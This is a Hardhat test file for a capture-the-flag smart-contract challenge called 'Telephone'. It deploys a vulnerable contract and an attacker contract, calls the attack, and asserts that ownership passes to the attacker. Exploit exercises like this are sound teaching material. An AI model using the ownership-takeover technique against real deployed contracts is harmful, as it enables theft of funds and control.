const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Telephone Attack', function () {

    let deployer, attacker;
    let baseContract, attackContract;


    before(async function () {
        /** SETUP SCENARIO */
        [deployer, attacker] = await ethers.getSigners();

        const baseContractFactory = await ethers.getContractFactory('Telephone', deployer);
        const attackContractFactory = await ethers.getContractFactory('AttackTelephone', attacker);
        baseContract = await baseContractFactory.deploy();
        attackContract = await attackContractFactory.deploy(baseContract.address);

        await baseContract.deployed();
        await attackContract.deployed();

        expect(
            await baseContract.owner()
        ).to.equal(deployer.address);
    });

    it('Exploit Telephone Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const tnx = await attackContract.connect(attacker).attack(attacker.address);
        await tnx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await baseContract.owner()
        ).to.be.equal(attacker.address);

    });
});